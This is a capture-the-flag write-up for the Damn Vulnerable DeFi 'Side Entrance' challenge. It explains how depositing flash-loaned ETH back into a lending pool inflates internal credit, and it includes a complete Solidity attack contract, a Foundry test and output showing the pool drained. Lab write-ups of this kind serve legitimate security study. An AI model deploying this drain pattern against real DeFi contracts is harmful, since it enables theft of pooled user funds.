# Side Entrance — Damn Vulnerable DeFi v4 Challenge

**Author:** 0xmaurice

**Date:** November 14, 2025

**Challenge:** Damn Vulnerable DeFi v4 — *Side Entrance*

**Objective:** You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

---

## Summary

The `flashLoan()` function will not revert when the balance of the pool stays the same. We can call the `flashLoan()` function end `execute` a `deposit` in the same transaction. The balance of the pool will be the same as before, but the internal balance tracking updated to the user being the holder of the whole balance instead of the pool. Shortly after the user can withdraw all the funds.

---

## Scope & Setup

- **SideEntranceLenderPool.sol**
  - Contract for lending out flash loans in ETH and depositing/withdrawing in and out of the pool.
  - Holds `ETHER_IN_POOL = 1000e18` of ETH in the pool.
- **Player account**
  - Must recover all funds and transfer them to the recovery wallet.
  - Starts with 1 ETH

**Goal:** Transfer the entire pool balance to the recovery wallet.

---

## Proof of Concept (PoC)

**We can drain the pool in 2 steps:**

### 1) Take a flash loan and deposit the borrowed ETH
Calling `SideEntranceLenderPool::flashLoan()` with our attack contract triggers:

```javascript
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
```
This calls `FlashLoanAttack::execute()` in our contract.  
Inside `execute()` we deposit the borrowed ETH back into the pool:

```javascript
pool.deposit{value: msg.value}();
```

This updates the pool’s internal `balances` mapping so that our contract now “owns” the entire `ETHER_IN_POOL`.

### 2) Withdraw the manipulated internal balance
Next, we call `withdraw()`.  
The pool sends `ETHER_IN_POOL` to our contract, triggering our `receive()` function, which forwards the ETH to the recovery address.

---

### Foundry Test Example

**Attack Contract**

```javascript
contract FlashLoanAttack {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();
    }

    receive() external payable {
        (bool success,) = payable(recovery).call{value: msg.value}("");
        require(success);
    }
}
```
**Test**

```javascript
    function test_sideEntrance() public checkSolvedByPlayer {
        console.log("ETH Balance of the pool before: ", address(pool).balance);
        console.log("ETH Balance of the recovery wallet before: ", recovery.balance, "\n");

        // Deploying the FlashLoanAttacker Contract
        FlashLoanAttack flashLoanAttack = new FlashLoanAttack(pool, recovery);
        // Borrowing ETHER_IN_POOL as a flash loan from the pool and depositing ETHER_IN_POOL back into the pool as msg.sender==flashLoanAttack
        flashLoanAttack.flashLoan(ETHER_IN_POOL);
        // Withdrawing ETHER_IN_POOL from the pool and transferring ETHER_IN_POOL to the recovery wallet
        flashLoanAttack.withdraw();

        console.log("ETH Balance of the pool after: ", address(pool).balance);
        console.log("ETH Balance of the recovery wallet after: ", recovery.balance);
    }
```

**Console Output**
```yaml
  ETH Balance of the pool before:  1000000000000000000000
  ETH Balance of the recovery wallet before:  0 

  ETH Balance of the pool after:  0
  ETH Balance of the recovery wallet after:  1000000000000000000000

```
We have successfully recovered the funds into the recovery wallet from the pool, using an attacker contract.

---

## Explanation

The key logic lies inside `flashLoan()`:

```javascript
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```
The loan only reverts if the pool’s balance ends up *lower* than before. But because the pool calls `execute()`, the borrower can perform arbitrary actions—including depositing the borrowed ETH:

```javascript
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
```

This restores the pool’s external balance, satisfying the flash-loan check, *while also increasing the attacker’s internal balance*:

```javascript
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }
```

After the flash loan completes, the attacker simply calls:

```javascript
    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }
```

This sends `ETHER_IN_POOL` to the attacker contract, which forwards it to the recovery wallet:

```javascript
    receive() external payable {
        (bool success,) = payable(recovery).call{value: msg.value}("");
        require(success);
    }
```


## Root Cause

The pool incorrectly treats deposits made during the flash loan as legitimate user-owned funds. Because deposits increase both the pool’s balance and the depositor’s internal credit, an attacker can borrow the entire pool balance, deposit the borrowed ETH to “repay” the loan, and then withdraw the deposit afterward. This drains the entire pool without spending any of the attacker’s own ETH.

---

## References

* [Damn Vulnerable DeFi Website](https://www.damnvulnerabledefi.xyz/)
* [Damn Vulnerable DeFi GitHub Repository](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0)

---

## Environment

* Solidity: `0.8.25`
* Framework: Foundry
* Challenge commit: `v4.1.0`

---

**Key Takeaway:**

*Flash loan repayment must come from external funds, not from internal accounting.*

---

*Note:* All research, code, and technical explanations were written by **0xmaurice**. Only sentence structure and grammar were reviewed and refined with the help of **ChatGPT**.

